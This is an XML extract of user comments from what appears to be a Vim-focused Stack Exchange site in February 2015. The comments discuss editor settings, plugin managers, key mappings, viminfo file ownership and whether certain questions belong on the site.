  <row Id="364" PostId="344" Score="0" Text="I didn't notice in my earlier tests, I even changed strings in the binary file, and it worked. Now on closer look I see that Vim adds an end of line character, unless I switch on binary mode. So you're right, I updated my post, thanks for pointing this out!" CreationDate="2015-02-04T21:39:53.230" UserId="135" />
  <row Id="365" PostId="361" Score="0" Text="Really? This history does not persist after quitting for me. (Vim 7.4.52, Ubuntu 14.04)" CreationDate="2015-02-04T21:45:54.420" UserId="88" />
  <row Id="366" PostId="361" Score="1" Text="@Doorknob maybe you switched it off? By default it keeps the history, and it's pretty handy. Good question, I'm curious to find out the answer." CreationDate="2015-02-04T21:47:09.147" UserId="135" />
  <row Id="367" PostId="357" Score="5" Text="You can even have multiple comma-separated colorcolumns!" CreationDate="2015-02-04T22:02:33.957" UserId="24" />
  <row Id="368" PostId="361" Score="2" Text="@Doorknob Make sure your `~/.viminfo` is owned by you.  A common mistake is for people to run `sudo vim ...` which, if you haven't run vim as your own user before, will create `~/.viminfo` as root.  If that is the problem, I'd suggest learning to use `sudoedit` or `sudo -e` to edit privileged files." CreationDate="2015-02-04T22:04:35.680" UserId="15" />
  <row Id="369" PostId="361" Score="0" Text="@jamessan Huh, it appears that was indeed the problem; `chown`'ing my .viminfo back to myself fixed it. (Not sure how its ownership got changed to root, since I've always used `sudoedit`, but oh well.)" CreationDate="2015-02-04T22:08:20.553" UserId="88" />
  <row Id="370" PostId="176" Score="0" Text="@romainl I understand now. It was a case of XY problem then. In this case is it appropriate to accept the best answer to the X or the best answer to the Y?" CreationDate="2015-02-04T22:37:05.227" UserId="161" />
  <row Id="371" PostId="364" Score="1" Text="Won't this really be better off at [security.se], given that you have already identified the algorithm(s) being used?" CreationDate="2015-02-04T22:49:28.343" UserId="205" />
  <row Id="372" PostId="364" Score="0" Text="@muru Well, it's a Vim question? I suppose it might be a good fit for both sites?" CreationDate="2015-02-04T22:49:47.317" UserId="51" />
  <row Id="374" PostId="190" Score="1" Text="I also really like the YouCompleteMe plugin, as it suggests as-you-type and you can either choose or ignore suggestions. Yes, visually it is hard to ignore,but it is very unintrusive in my workflow because it requires fewer key strokes." CreationDate="2015-02-04T22:51:05.783" UserId="322" />
  <row Id="376" PostId="348" Score="0" Text="You are right! I am pretty sure I had tested that, but I must have changed something. I have updated the script in the post, see if it is working for you now." CreationDate="2015-02-04T22:53:03.700" UserId="81" />
  <row Id="377" PostId="364" Score="0" Text="Hmm. The docs are a bit confusing here. `:h encryption` says undo and swap files are encrypted in both [7.3](http://vimdoc.sourceforge.net/htmldoc/editing.html#encryption) and [7.4](http://vimhelp.appspot.com/editing.txt.html#encryption), yet [`:h cryptmethod`](http://vimhelp.appspot.com/options.txt.html#%27cryptmethod%27) in 7.4 makes explicit mention of the `undo` file only for `blowfish2`." CreationDate="2015-02-04T23:00:07.497" UserId="205" />
  <row Id="378" PostId="189" Score="0" Text="I would add that output file is `vimrc.profile` in the current directory" CreationDate="2015-02-04T23:02:35.893" UserId="179" />
  <row Id="379" PostId="350" Score="1" Text="ah, I should have mentioned this - I'm running OS X, but SSHing into a Ubuntu server most of the time." CreationDate="2015-02-04T23:27:51.097" UserId="2" />
  <row Id="380" PostId="213" Score="0" Text="@alxndr then add `:let @/=&quot;&quot;&lt;C-R&gt;` to clear the last search." CreationDate="2015-02-04T23:29:49.990" UserId="142" />
  <row Id="381" PostId="213" Score="0" Text="It would also be nice to avoid modifying the search at all, in case I already have something highlighted which I'd like to keep highlighted... But I suppose that's the price of using the search feature." CreationDate="2015-02-04T23:34:16.637" UserId="67" />
  <row Id="382" PostId="273" Score="0" Text="Thanks for the explanation! It looks like I need to read up on text objects." CreationDate="2015-02-04T23:42:52.323" UserId="261" />
  <row Id="384" PostId="360" Score="0" Text="Similarly, you can switch to the other window with `Ctrl-w w` and close it with `Ctrl-w c`, leaving you with just the help." CreationDate="2015-02-04T23:47:57.403" UserId="141" />
  <row Id="386" PostId="370" Score="3" Text="This is also little better than a link-only answer." CreationDate="2015-02-04T23:51:06.903" UserId="24" />
  <row Id="387" PostId="372" Score="0" Text="I'm aware that OP's situation is different, but this is a valid answer for some users." CreationDate="2015-02-04T23:51:35.300" UserId="212" />
  <row Id="390" PostId="360" Score="0" Text="Picking highest voted answer." CreationDate="2015-02-05T00:06:11.530" UserId="189" />
  <row Id="392" PostId="364" Score="1" Text="@muru It's a question about Vim's implementation of blowfish-based encryption, not about the blowfish algorithm itself. This question would also be on-topic on [security.se], but that doesn't make it off-topic here. The answer is, in fact, that blowfish itself is secure (even if it isn't the best choice), but that Vim's implementation of it is bad." CreationDate="2015-02-05T00:17:55.180" UserId="8" />
  <row Id="393" PostId="364" Score="0" Text="@Gilles To be fair, the original question *also* asked about Blowfish. This was a mistake, and I've edited the  question since and removed it (I already know the answer, anyway). So muru was right :-)" CreationDate="2015-02-05T00:18:46.617" UserId="51" />
  <row Id="394" PostId="351" Score="0" Text="@janos Mine not only un-indents `.chainCall2()`, it _indents_ the `var` line to match `.chainCall1()`  =o_0=" CreationDate="2015-02-05T00:26:33.993" UserId="238" />
  <row Id="397" PostId="213" Score="1" Text="If you want to protect your existing search you can prepend `:let searchbak=@/&lt;CR&gt;` and append `:let @/=searchbak&lt;CR&gt;`. But at this point it's getting kind of long and unapproachable and maybe should just be a function." CreationDate="2015-02-05T01:18:44.963" UserId="195" />
  <row Id="398" PostId="301" Score="2" Text="How about mimicking `jk`? Find two keys which are adjacent in Dvorak but not common combinations in your preferred language. `tn`, for example, is the positional equivalent of `jk`." CreationDate="2015-02-05T01:19:55.127" UserId="212" />
  <row Id="399" PostId="303" Score="2" Text="Agreed. Habitual use of `&lt;C-c&gt;` can subtly break plugins and autocmds." CreationDate="2015-02-05T01:22:39.440" UserId="212" />
  <row Id="400" PostId="386" Score="0" Text="I like this. It's an available, open mapping with a clear mnemonic." CreationDate="2015-02-05T02:06:25.230" UserId="130" />
  <row Id="401" PostId="386" Score="1" Text="I think `&lt;esc&gt;BdiWi` might be better. `vBda` doesn't seem to behave consistently (try inside, for example, `db:seed`)." CreationDate="2015-02-05T02:15:21.303" UserId="205" />
  <row Id="403" PostId="350" Score="0" Text="That's good news! If the vim on the other end of the ssh responds to the scroll events, then your terminal emulator is sending the scroll events through and the answer above should work for you, both locally running vim and remotely running vim. If you comment with the name of your terminal emulator, I'll add it to the answer." CreationDate="2015-02-05T03:13:22.037" UserId="227" />
  <row Id="404" PostId="386" Score="2" Text="When doing one of normal mode commands from insert mode, consider using `&lt;C-o&gt;` instead" CreationDate="2015-02-05T03:24:05.020" UserId="74" />
  <row Id="405" PostId="390" Score="6" Text="Just to be clear, pathogen is not a plugin manager. All it does is manage the runtimepath. That's it. Any plugins you add to ~/.vim/bundle (i.e. the default location, you can change this), it adds the plugin's files to vim's runtimepath so they are accessible. The manually installing, updating, removing is not really a con if you don't have that many plugins installed. Additionally, when updating plugins, you can choose to fetch only a subset of the changes, and not update to the latest version of a plugin, which gives you a lot of control." CreationDate="2015-02-05T03:24:09.203" UserId="246" />
  <row Id="406" PostId="390" Score="1" Text="@AkshayHegde Yes, once I started writing the Vundle answer I had to go back and edit out &quot;plugin manager&quot; from this answer. Seconded about the con, that's why I continue to use it instead of anything else." CreationDate="2015-02-05T03:30:00.383" UserId="205" />
  <row Id="407" PostId="128" Score="0" Text="I think you meant %:p: **t** will return text.txt" CreationDate="2015-02-05T04:20:27.913" UserId="227" />
  <row Id="408" PostId="397" Score="1" Text="adds lazy loading too" CreationDate="2015-02-05T04:35:25.430" UserId="27" />
  <row Id="410" PostId="321" Score="1" Text="This doesn't work for selecting a single word in a line. (see question mentions word level selection)" CreationDate="2015-02-05T04:40:57.207" UserId="301" />
  <row Id="411" PostId="397" Score="0" Text="I've always used Vundle, didn't know about vim-plug .. looks awesome, thanks for the tip" CreationDate="2015-02-05T06:00:05.237" UserId="248" />
  <row Id="412" PostId="400" Score="0" Text="This seems very similar to this other question: http://vi.stackexchange.com/questions/9/can-i-implement-vim-macros-using-python" CreationDate="2015-02-05T07:00:07.830" UserId="135" />
  <row Id="413" PostId="400" Score="3" Text="Asking for resources isnt a question with a definitive answer. Like asking for a tutorial or a good book." CreationDate="2015-02-05T07:04:36.197" UserId="301" />
  <row Id="415" PostId="190" Score="2" Text="I've changed the animations to be &quot;on click&quot;, in the sense that they are linked to the gif animations." CreationDate="2015-02-05T07:06:13.840" UserId="130" />
  <row Id="417" PostId="400" Score="2" Text="I would agree that I'm asking for a tutorial (or a good book were it only to exist). I wouldn't agree that it's a bad thing. I must admit that I'm colored by [math.se], which uses the [tag:reference-request] tag as a way to direct new learners towards good resources instead of being lost in the vast ocean of mediocrity that is the standard level of resources out there." CreationDate="2015-02-05T07:10:07.583" UserId="130" />
  <row Id="418" PostId="363" Score="0" Text="An aside, if this is reStructuredText, you might consider looking into `list-table` (recently I converted many tables to this, because ascii tables are hard to maintain and diff poorly)" CreationDate="2015-02-05T07:11:17.077" UserId="301" />
  <row Id="419" PostId="400" Score="1" Text="Treatment of this genre of questions [is being discussed on Meta](http://meta.vi.stackexchange.com/q/38/24)." CreationDate="2015-02-05T07:27:25.497" UserId="24" />
  <row Id="423" PostId="85" Score="0" Text="Treatment of this genre of questions [is being discussed on Meta](http://meta.vi.stackexchange.com/q/38/24)." CreationDate="2015-02-05T07:34:32.943" UserId="24" />
  <row Id="424" PostId="176" Score="1" Text="@Kit, that's one of the many problems with XY problem qustions. The most upvoted answer is a high-quality direct answer to your question but ultimately useless in the context of your real problem while my less upvoted answer is an actual solution to your underlying problem. Both answers are correct but they answer different questions which makes it hard for you to decide. If it was me, I would accept the answer that addresses my core issue… but that's just me." CreationDate="2015-02-05T07:38:00.383" UserId="54" />
  <row Id="425" PostId="405" Score="2" Text="This is not naïve by any means." CreationDate="2015-02-05T07:42:50.317" UserId="54" />
  <row Id="426" PostId="405" Score="2" Text="@romainl it's only naive until you map it to something shorter I guess" CreationDate="2015-02-05T07:55:58.127" UserId="74" />
  <row Id="427" PostId="299" Score="0" Text="@derobert `setlocal syntax=OFF` works, although not with `BufReadPre *` - I had to change the autocommand back to `Filetype xml` for this. Seems like it's nontrivial which commands work in which autocommand contexts..." CreationDate="2015-02-05T08:34:41.877" UserId="117" />
  <row Id="428" PostId="135" Score="0" Text="In case of you didn't know about 'u' - undo." CreationDate="2015-02-05T08:51:48.193" UserId="336" />
  <row Id="429" PostId="410" Score="0" Text="I kind of get your desire to fill up this site with as many questions as possible but… that question has been answered dozens of times over the years on SO/SU and elsewhere: `xargs` uses a dummy `stdin` that can't be used by Vim and breaks everything afterwards." CreationDate="2015-02-05T09:08:41.727" UserId="54" />
  <row Id="430" PostId="410" Score="1" Text="@romainl I'm not active on those sites, and I've never seen it asked there — honest." CreationDate="2015-02-05T09:09:42.850" UserId="24" />
  <row Id="437" PostId="365" Score="1" Text="would really like to know the answer to this, I would suggest that it will be possible with syntax highlighting this post on SO may be relevant http://stackoverflow.com/questions/7033310/vim-custom-syntax-highlighting-background-only" CreationDate="2015-02-05T10:24:26.147" UserId="11" />
  <row Id="438" PostId="405" Score="1" Text="I prefer Y instead of yy, because I find it slower to type doubled characters in general." CreationDate="2015-02-05T10:36:54.047" UserId="135" />
  <row Id="439" PostId="407" Score="2" Text="This doesn't really apply for `map`. The '\' is used to escape key codes when using `normal` via `execute` calls. Very confusing imho. Example from the `execute` help: `:execute &quot;normal ixxx\&lt;Esc&gt;&quot;`. The use in `mapleader` is probably related to that. Or it just accepts `expr-string`s." CreationDate="2015-02-05T10:50:05.550" UserId="20" />
  <row Id="440" PostId="410" Score="0" Text="Related: http://superuser.com/questions/336016/invoking-vi-through-find-xargs-breaks-my-terminal-why - perhaps someone can condense the top answers to a great answer." CreationDate="2015-02-05T10:53:06.147" UserId="205" />
  <row Id="442" PostId="308" Score="2" Text="Tim Pope released [vim-haystack](https://github.com/tpope/vim-haystack) today. It sounds similar to what you need. Maybe you can get some inspiration from it or maybe even use it." CreationDate="2015-02-05T11:38:47.747" UserId="20" />
  <row Id="443" PostId="413" Score="1" Text="I would suggest &quot;s/recommand/recommend/&quot;, &quot;s/already exist options/already existing options/&quot;, &quot;s/then set capslock as additional ctrl/then sets capslock as an additional ctrl/&quot;, &quot;s/may useful in case of you have/may be useful in case you have/&quot;, &quot;s/is other options relate/are other options related to/&quot;. Apologies for not doing it myself, but don't have the rep yet" CreationDate="2015-02-05T11:42:01.607" UserId="182" />
  <row Id="444" PostId="128" Score="0" Text="@JohnO'M. yep, that's right thanks :D. Fixed." CreationDate="2015-02-05T12:43:06.863" UserId="133" />
  <row Id="445" PostId="389" Score="2" Text="Agreed. I've had lots of problems with YCM (including the mentioned segfaults). And even after hours of configuration, I never had it fully working." CreationDate="2015-02-05T12:45:12.790" UserId="133" />
  <row Id="446" PostId="406" Score="1" Text="Do you mean &quot;leaving just Control+[&quot; rather than &quot;leaving just Escape+[&quot;?" CreationDate="2015-02-05T12:51:54.620" UserId="343" />
  <row Id="455" PostId="429" Score="1" Text="+1 for an answer. However (and correct me if I am wrong) but `guibg` only works for gvim, is that right?" CreationDate="2015-02-05T14:35:57.263" UserId="307" />
  <row Id="456" PostId="429" Score="1" Text="@Karolis Yes. For terminal Vim you need to use `ctermbg`, as stated." CreationDate="2015-02-05T14:38:27.033" UserId="343" />
  <row Id="460" PostId="423" Score="0" Text="Note: I like to use `set listchars=tab:!·,trail:·`, IMHO `·` is a lot clearer than a `-` ... You need a fairly recent Vim version for this to work btw (not sure which exactly, I think 7.3.x)..." CreationDate="2015-02-05T15:07:15.977" UserId="51" />
  <row Id="461" PostId="429" Score="1" Text="If you use folds, then you get what you want: The folds have a different bg colour, however, this is accomplished by filling the background with space characters which have a different bg colour set... This causes some side-effects: copy/paste won't properly work anymore (as it will also copy a lot of space characters, this is also how you can verify this for yourself)." CreationDate="2015-02-05T15:11:17.650" UserId="51" />
  <row Id="462" PostId="430" Score="0" Text="See also `set lcs=tab:├─`" CreationDate="2015-02-05T15:33:43.393" UserId="348" />
  <row Id="463" PostId="387" Score="0" Text="I used to use a variant of this: Just use `:%s/pattern/replace/` and then press `u` for undo, you can see the parts that Vim changed if you have `hlsearch` enabled. And you can replace this text again with `^R`." CreationDate="2015-02-05T15:35:39.033" UserId="51" />
  <row Id="465" PostId="389" Score="0" Text="I had YCM server crashed numerous times , looking forward to clang_complete , here is relevant information for other users : https://github.com/Rip-Rip/clang_complete/blob/master/doc/clang_complete.txt" CreationDate="2015-02-05T16:12:30.970" UserId="101" />
  <row Id="468" PostId="436" Score="0" Text="Hm, still doesn't seem to do anything? It works as if I use `set t_te=`, but it's supposed to do more, I think?" CreationDate="2015-02-05T16:27:12.963" UserId="51" />
  <row Id="469" PostId="418" Score="0" Text="Thank you, this is a really great answer. Works for any number of lines and can even be modified to include other characters (not only #) easily. Shame I can only give 1 upvote and accept only a single answer. This time I had to go with the one I am more familiar with (and writing functions - I am not familiar with that, but thanks to you I see how they work)." CreationDate="2015-02-05T16:38:01.087" UserId="307" />
  <row Id="470" PostId="90" Score="1" Text="@yo' I think you mean `5gj`" CreationDate="2015-02-05T17:23:15.813" UserId="51" />
  <row Id="471" PostId="172" Score="0" Text="Why do you use `'s` as a pattern? Isn't just searching for `'` correct, asl well? This will miss words that have a `'`  in a different location (such as `you'd`, `you've`, etc.)" CreationDate="2015-02-05T17:44:40.693" UserId="51" />
  <row Id="472" PostId="413" Score="0" Text="This is a nice workaround, but I've already remapped [CapsLock] to be my [Control]..." CreationDate="2015-02-05T18:20:17.320" UserId="67" />
  <row Id="473" PostId="441" Score="3" Text="Without `'wildmenu'`, you get one completion after another via Tab, or still the whole list with Ctrl-D. Suggest mentioning that." CreationDate="2015-02-05T18:20:28.777" UserId="31" />
  <row Id="474" PostId="406" Score="0" Text="Whoops, thanks @Rich!" CreationDate="2015-02-05T18:21:12.277" UserId="67" />
  <row Id="475" PostId="443" Score="0" Text="Makes sense. I was hoping there was something more simple, without visual mode." CreationDate="2015-02-05T18:44:12.150" UserId="226" />
  <row Id="476" PostId="443" Score="0" Text="@aharris88 I did a little research on this and I can't find a simpler way to do it. I'd love to be proven wrong, though!" CreationDate="2015-02-05T18:46:48.113" UserId="2" />
  <row Id="477" PostId="441" Score="0" Text="@derobert Ah, didn't know that. I'm so used to using `Tab` :-)" CreationDate="2015-02-05T18:47:53.317" UserId="51" />
  <row Id="478" PostId="443" Score="1" Text="You can always rebind this key combination to something else (like `noremap p Vp`)." CreationDate="2015-02-05T18:57:47.883" UserId="51" />
  <row Id="479" PostId="388" Score="5" Text="Voted to reopen: I have edited this question to remove the 'recommend me one'-part ... Having an (objective) overview of the differences is *not* opinion based, and actually quite useful." CreationDate="2015-02-05T19:02:18.313" UserId="51" />
  <row Id="480" PostId="443" Score="0" Text="Yeah, but `p` is too useful to overwrite. `Vp` is fine. I don't need it that often." CreationDate="2015-02-05T19:06:40.047" UserId="226" />
  <row Id="481" PostId="393" Score="0" Text="You should accept your own answer. It seems to completely resolve the question." CreationDate="2015-02-05T19:16:28.530" UserId="126" />
  <row Id="482" PostId="446" Score="0" Text="Depending on the community decision, I'll either merge this with Carpetsmoker's answer or split up into individual answers." CreationDate="2015-02-05T19:19:40.463" UserId="205" />
  <row Id="483" PostId="446" Score="1" Text="I'll split my answer :-) Hold on" CreationDate="2015-02-05T19:21:38.657" UserId="51" />
  <row Id="484" PostId="397" Score="0" Text="I've made this answer a bit better, but I've never used either vim-plug not Vundle, so I can't really judge the differences ....." CreationDate="2015-02-05T19:31:53.090" UserId="51" />
  <row Id="485" PostId="410" Score="1" Text="Great question - this has happened to me numerous times. Also, I don't use any other SO sites - if it's vim-related, I'd like to find it here." CreationDate="2015-02-05T19:38:43.450" UserId="248" />
  <row Id="486" PostId="172" Score="0" Text="Yep, you're right. I've edited my answer." CreationDate="2015-02-05T19:52:17.527" UserId="142" />
  <row Id="487" PostId="456" Score="0" Text="Can you clarify what the `%` is for?" CreationDate="2015-02-05T19:53:11.190" UserId="91" />
  <row Id="489" PostId="456" Score="2" Text="`%` is a special symbol that refers to the entire file.  If you only wanted to run it for lines 1-10, you could do `:1,10s`.  `:help cmdline-ranges` in Vim will bring up the documentation for ranges." CreationDate="2015-02-05T20:00:05.110" UserId="355" />
  <row Id="490" PostId="298" Score="0" Text="possible duplicate of [How can I open very large files with good performance?](http://vi.stackexchange.com/questions/149/how-can-i-open-very-large-files-with-good-performance)" CreationDate="2015-02-05T20:01:02.250" UserId="91" />
  <row Id="491" PostId="172" Score="0" Text="Thanks :-) I wasn't sure if you did that with a reason, so was hesitant to edit it myself..." CreationDate="2015-02-05T20:01:14.197" UserId="51" />
  <row Id="492" PostId="298" Score="0" Text="Although this Q is well written, it does seem to cover broadly the same ground (in fact, a subset) of this one: http://vi.stackexchange.com/questions/149/how-can-i-open-very-large-files-with-good-performance" CreationDate="2015-02-05T20:01:26.560" UserId="91" />
  <row Id="494" PostId="402" Score="0" Text="It doesn't directly answer your question, but it's worth saying that some markup langs (e.g. Markdown) also support a leading `#` character instead for a level 1 heading, `##` for level 2, etc. That's how I write Markdown, and I find it clearer that way anyway." CreationDate="2015-02-05T20:12:59.427" UserId="91" />
  <row Id="495" PostId="457" Score="5" Text="`Q` and `q:` are quite different.  You're only referring to `Q` right?" CreationDate="2015-02-05T20:21:08.863" UserId="15" />
  <row Id="498" PostId="457" Score="0" Text="@jamessan, actually, it turns out that I wasn't sure ... you're right, they do seem to do different things, although I had assumed they were basically the same. If you answer this question, it might help to clarify there, as I'm obviously confused." CreationDate="2015-02-05T20:25:43.917" UserId="91" />
  <row Id="501" PostId="298" Score="2" Text="@AndrewFerrier I'd argue against that. The other question is about general tips for handling big files. Mine is about _implementing_ one rather specific piece of the puzzle under a given set of restrictions. Just compare the answers - the answers to the other question will tell me to turn off syntax, but not how to do that dynamically in a single buffer for a single file type. Thus it will not solve my far more specific problem. They're related but not duplicates as they ask for different things and lead to different responses." CreationDate="2015-02-05T20:33:14.857" UserId="117" />
  <row Id="502" PostId="459" Score="0" Text="@aharris88 - A yes, that does appear to be a proper solution, I just missed it. I'm more interested in recovery of a session after quitting vim, so perhaps there's a simpler solution other than using `:mksession` and saving session state to a file?" CreationDate="2015-02-05T20:35:15.037" UserId="323" />
  <row Id="503" PostId="298" Score="0" Text="l4mpi, that's a fair point, I hadn't spotted the filetype thing too. Just testing the waters of the new beta here partially! Point taken. I'll withdraw my duplicate vote." CreationDate="2015-02-05T20:35:54.223" UserId="91" />
  <row Id="504" PostId="463" Score="0" Text="OK, thanks. Are you sure `q:` *is* the Ex command-line? The help only uses the phrase &quot;Ex&quot; for he mode brought up by `Q`, but that doesn't support the standard vim editing you are referring to - only `q:` does, which the help simply calls 'Command line mode'. I know I confused the two at first, but we should probably make sure we are clear about the distinction here." CreationDate="2015-02-05T20:40:57.320" UserId="91" />
  <row Id="505" PostId="463" Score="1" Text="I searched `:help q:` before I decided to use that phrase, but I might be confused about the terminology." CreationDate="2015-02-05T20:42:59.560" UserId="141" />
  <row Id="506" PostId="141" Score="0" Text="@CodyPoll I know. Everything is ok up to `I`. When I press `I`, then the `#` will be placed only in front of the first line." CreationDate="2015-02-05T20:43:59.733" UserId="83" />
  <row Id="507" PostId="463" Score="0" Text="You're right, I just spotted it: &quot;From Normal mode, use the &quot;q:&quot;, &quot;q/&quot; or &quot;q?&quot; command. This starts editing an Ex command-line (&quot;q:&quot;)&quot;. Thanks." CreationDate="2015-02-05T20:44:16.070" UserId="91" />
  <row Id="508" PostId="463" Score="1" Text="I've been confused about this terminology too.  I usually talk about typing an Ex command as anything following `:`, but I could be using that wrong." CreationDate="2015-02-05T20:45:51.693" UserId="141" />
  <row Id="509" PostId="221" Score="2" Text="FYI, as of Vim 7.4.480, `*.md` files are recognized as Markdown instead of modula2 by default." CreationDate="2015-02-05T20:49:38.837" UserId="300" />
  <row Id="510" PostId="466" Score="0" Text="Your answer says no, but it seems like that works great!" CreationDate="2015-02-05T21:00:08.017" UserId="226" />
  <row Id="511" PostId="466" Score="0" Text="(I meant &quot;no&quot; in the sense that you can't do it without re-opening files). Does it actually renumber from 1 for you though? I thought it did when I first tried it, but now I'm seeing it *not* renumber for me?" CreationDate="2015-02-05T21:01:05.163" UserId="72" />
  <row Id="512" PostId="446" Score="0" Text="This is (probably) in reference to a cleaning product named &quot;vim&quot; that was quite common in the Netherlands (AFAIK it doesn't exist any more)." CreationDate="2015-02-05T21:01:38.903" UserId="51" />
  <row Id="513" PostId="466" Score="0" Text="Yeah, it renumbers for me." CreationDate="2015-02-05T21:03:51.260" UserId="226" />
  <row Id="514" PostId="466" Score="0" Text="Yeah, I'm just dumb, I found my mistake." CreationDate="2015-02-05T21:04:09.387" UserId="72" />
  <row Id="515" PostId="215" Score="0" Text="I disable this keybinding/mode with `map q: &lt;Nop&gt;` in ~/.vimrc, as I find it very irritating, and never really use it." CreationDate="2015-02-05T21:21:10.800" UserId="91" />
  <row Id="516" PostId="469" Score="0" Text="I don't believe that is a standard file for vim to create. Can you please try running vim with `-u NONE` (i.e. no `~/.vimrc` to see if it still does it?" CreationDate="2015-02-05T21:36:57.210" UserId="91" />
  <row Id="517" PostId="469" Score="0" Text="@AndrewFerrier That's  a negative. Also it only does it for files in some directories. I tested in a scratch area and it doesn't do it, but for example a git repo with a bunch of LaTeX stuff in it leaves them behind on every edit." CreationDate="2015-02-05T21:42:02.817" UserId="267" />
  <row Id="518" PostId="349" Score="0" Text="About pressing the `Ctrl` key (at the regular position) **without** twisting the little finger: you can press it with the external palm of the hand, as it is described well [here](http://ergoemacs.org/emacs/emacs_pinky.html)  (I found this nice clever trick on the 'Net, time to give it back :) and kudos to who invented it)" CreationDate="2015-02-05T21:42:57.677" UserId="311" />
  <row Id="519" PostId="469" Score="0" Text="So it sounds to me, therefore, like you are loading a plugin which does that instead. Suggest you do a binary search (aka comment half of them) for the plugins you have installed to narrow down the culprit." CreationDate="2015-02-05T21:43:54.517" UserId="91" />
  <row Id="520" PostId="469" Score="1" Text="@AndrewFerrier How about `grep -R project.vim ~/.vim`? It looks like [Automatic LaTeX Plugin](http://atp-vim.sourceforge.net/) is to blame. I edit so many LaTeX files these days I didn't notice it wasn't happening except on these. That gives me a place to look for how to shut it off. Either I'll answer someday or anybody that looks up how ATP works can answer..." CreationDate="2015-02-05T21:57:02.230" UserId="267" />
  <row Id="521" PostId="470" Score="0" Text="Here is some bonus information that is not really part of the answer: For me, on OpenSUSE, gvim (the GTK GUI for vim) does this automatically when it gains focus. I don't really know why it does it and I haven't checked on other systems but I thought it might be useful as an extra. Maybe someelse can confirm?" CreationDate="2015-02-05T22:05:39.807" UserId="20" />
  <row Id="522" PostId="141" Score="0" Text="@CodyPoll Ok.. I was just inpatient. I did not press `Esc` after the procedure described." CreationDate="2015-02-05T22:07:26.137" UserId="83" />
  <row Id="523" PostId="141" Score="0" Text="@gon1332 as far as I know you need to press `Esc` at the end." CreationDate="2015-02-05T22:07:57.487" UserId="356" />
  <row Id="525" PostId="471" Score="0" Text="I'm voting to close as Too Broad because you're asking for a list of &quot;pros and cons of each method,&quot; which doesn't fit well with the Stack Exchange Q&amp;A format." CreationDate="2015-02-05T22:14:55.933" UserId="88" />
  <row Id="526" PostId="471" Score="3" Text="@Doorknob I'm pretty sure (I asked this having done some homework first!) there are only about 6 factors to consider here (e.g. speed of reading, order of precedence, what defaults can or can't be touched, how you sync settings between computers, etc.) I don't see how this can't be dealt with pretty thoroughly in the space of a good answer." CreationDate="2015-02-05T22:17:29.360" UserId="267" />
  <row Id="527" PostId="471" Score="4" Text="I think the question is appropriate as a question about why gvimrc exists, rather than a list of pros and cons." CreationDate="2015-02-05T22:20:05.970" UserId="72" />
  <row Id="528" PostId="471" Score="1" Text="Sounds reasonable. Close vote retracted." CreationDate="2015-02-05T22:38:17.703" UserId="88" />
  <row Id="530" PostId="474" Score="0" Text="@aharris88 Did you read my question and that question? This is entirely about python. That has nothing to do with python. I chose this challenge for no other reason than I liked that question" CreationDate="2015-02-05T23:07:29.607" UserId="130" />
  <row Id="531" PostId="474" Score="1" Text="Yes, you're right. Sorry. I didn't realize the distinction between python and vim." CreationDate="2015-02-05T23:10:22.713" UserId="226" />
  <row Id="532" PostId="474" Score="7" Text="Hmm, this one is borderline, but I'd consider this more of a question for [so]. I won't closevote, but I'm worried questions like these are going to turn the site into just an SO clone." CreationDate="2015-02-05T23:11:54.080" UserId="88" />
  <row Id="534" PostId="457" Score="0" Text="This question is being [discussed on Meta](http://meta.vi.stackexchange.com/q/129/24)." CreationDate="2015-02-05T23:39:28.733" UserId="24" />
  <row Id="537" PostId="471" Score="0" Text="One specific example which I find useful is `winpos` which changes the position of the window used by gvim. This has no effect (and makes no sense) within `~/.vimrc`, it has to be in `~/.gvimrc`" CreationDate="2015-02-06T00:02:25.973" UserId="182" />
  <row Id="540" PostId="477" Score="0" Text="http://vim.wikia.com/wiki/List_changes_to_the_current_file#Capturing_list_of_change_locations ... Might be a good place to start ... No time to write a full answer now ;-)" CreationDate="2015-02-06T00:11:40.443" UserId="51" />
  <row Id="541" PostId="480" Score="2" Text="In order for this to work the syntax file you are using should make use of `syn-fold`. in my installation of vim74, only about 10% of the syntax files use it." CreationDate="2015-02-06T00:15:04.057" UserId="182" />
  <row Id="542" PostId="479" Score="1" Text="I've long had it mapped to `W`, but `w!!` makes much more sense, shall update my .vimrc. Thanks" CreationDate="2015-02-06T00:17:50.540" UserId="182" />
  <row Id="543" PostId="483" Score="0" Text="Is there also a way to easily see which words Vim corrected? I ran this on a file, and it generated a lot of gobbledygook ..." CreationDate="2015-02-06T00:18:04.890" UserId="51" />
  <row Id="544" PostId="477" Score="0" Text="@Carpetsmoker thx for the link" CreationDate="2015-02-06T00:26:31.663" UserId="188" />
  <row Id="545" PostId="393" Score="0" Text="@xthrd You can only accept your own solution when 48 hours have passed." CreationDate="2015-02-06T00:38:31.787" UserId="189" />
  <row Id="546" PostId="488" Score="1" Text="by `&lt;cr&gt;` do you mean &quot;Press the enter key&quot;?" CreationDate="2015-02-06T01:47:33.943" UserId="360" />
  <row Id="547" PostId="488" Score="1" Text="@Oxinabox Yep. (That's just Vim's notation for a carriage return.)" CreationDate="2015-02-06T01:47:55.717" UserId="88" />
  <row Id="548" PostId="488" Score="1" Text="Which i would need to use if I was making a macro, Ok cool." CreationDate="2015-02-06T01:48:22.990" UserId="360" />
  <row Id="549" PostId="488" Score="0" Text="What happens to Wholefile.md. It still exists, right?" CreationDate="2015-02-06T02:14:03.327" UserId="226" />
  <row Id="550" PostId="488" Score="0" Text="@aharris88 yes, no modifications are made to Wholefile.md due to these commands." CreationDate="2015-02-06T02:20:29.860" UserId="205" />
  <row Id="551" PostId="402" Score="0" Text="@Andrew Ferrier, Im not using markdown &amp; the question isnt specifically about markdown, its just an example of a markup that can use titles like this. I listed 3x different markups especially to avoid discussion on the specifics on any of the markup languages." CreationDate="2015-02-06T03:16:24.473" UserId="301" />
  <row Id="552" PostId="489" Score="0" Text="While this is impressive (I'm rather new to vim, so I'm discovering new things every day!), I'm afraid this isn't at all what I need. Maybe I should look into making my own plugin? It seems like a fun thing to do." CreationDate="2015-02-06T03:31:43.627" UserId="359" />
  <row Id="553" PostId="489" Score="2" Text="@Lukas In what way doesn't a mapping in your .vimrc solve the problem? Simply hitting Ctrl-B will then automatically fill out the header file for you. (I should probably make it clear the header file before replacing it with an updated version, but I have to sleep so I might do that later.) A plugin does sound interesting; keep me updated if you decide to make one. And thanks for the interesting challenge to sharpen up my Vim skills! ;)" CreationDate="2015-02-06T03:52:37.030" UserId="88" />
  <row Id="554" PostId="483" Score="0" Text="How terrifying. So this calls the macro while it is still recording that same macro?" CreationDate="2015-02-06T04:28:19.173" UserId="360" />
